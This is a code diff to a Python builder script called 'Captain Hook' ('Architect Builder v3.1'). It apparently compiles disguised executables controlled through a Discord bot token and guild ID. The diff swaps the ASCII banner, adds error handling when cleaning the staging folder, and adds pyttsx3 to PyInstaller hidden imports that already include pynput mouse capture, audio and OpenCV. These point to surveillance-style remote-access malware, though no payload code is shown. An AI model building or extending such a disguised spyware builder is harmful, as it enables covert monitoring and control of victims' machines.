@@ -71,21 +71,19 @@ DISGUISES = {
 def display_banner():
     banner = """
 [bold cyan]
-  ██████╗ █████╗ ██████╗ ████████╗ █████╗ ██╗███╗   ██╗
- ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║████╗  ██║
- ██║     ███████║██████╔╝   ██║   ███████║██║██╔██╗ ██║
- ██║     ██╔══██║██╔═══╝    ██║   ██╔══██║██║██║╚██╗██║
- ╚██████╗██║  ██║██║        ██║   ██║  ██║██║██║ ╚████║
-  ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
- 
-  ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
-  ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
-  ███████║██║   ██║██║   ██║█████╔╝ 
-  ██╔══██║██║   ██║██║   ██║██╔═██╗ 
-  ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
-  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+   ______ ___  ____  _________    _____   __
+  / ____//   ||  _ \/_  __/   |  /  _/ | / /
+ / /    / /| || |_) |/ / / /| |  / //  |/ / 
+/ /___ / ___ ||  __/ / // ___ | / // /|  /  
+\____//_/  |_||_|   /_//_/  |_||___/_/ |_/   
+                                            
+    __  ______  ____  __ __                 
+   / / / / __ \/ __ \/ //_/                 
+  / /_/ / / / / / / / ,<                    
+ / __  / /_/ / /_/ / /| |                   
+/_/ /_/\____/\____/_/ |_|                   
 [/bold cyan]
-[bold white]               - Architect Builder v3.1 - [/bold white]
+[bold white]          - Architect Builder v3.1 - [/bold white]
     """
     console.print(Panel(banner, border_style="cyan", padding=(1, 1)))
 
@@ -215,7 +213,15 @@ def build(token, guild_id, preset_name, disguise_name):
         # Step 1: Source Preparation
         progress.add_task(description="Preparing source files...", total=None)
         if os.path.exists("build_staging"):
-            shutil.rmtree("build_staging")
+            try:
+                shutil.rmtree("build_staging")
+            except PermissionError:
+                console.print("\n[bold red]Permission Error:[/bold red] Could not remove 'build_staging'.")
+                console.print("[yellow]Hint:[/yellow] This usually happens if you built with Docker. Try: [bold]sudo rm -rf build_staging[/bold]")
+                return
+            except Exception as e:
+                console.print(f"\n[bold red]Error cleaning build_staging:[/bold red] {e}")
+                return
         
         # Robust project root detection
         # 1. Try current working directory
@@ -307,7 +313,8 @@ def build(token, guild_id, preset_name, disguise_name):
             "--hidden-import=pynput.mouse._xorg",
             "--hidden-import=audioop",
             "--hidden-import=cv2",
-            "--hidden-import=numpy"
+            "--hidden-import=numpy",
+            "--hidden-import=pyttsx3"
         ]
         
         for module in preset["modules"]:
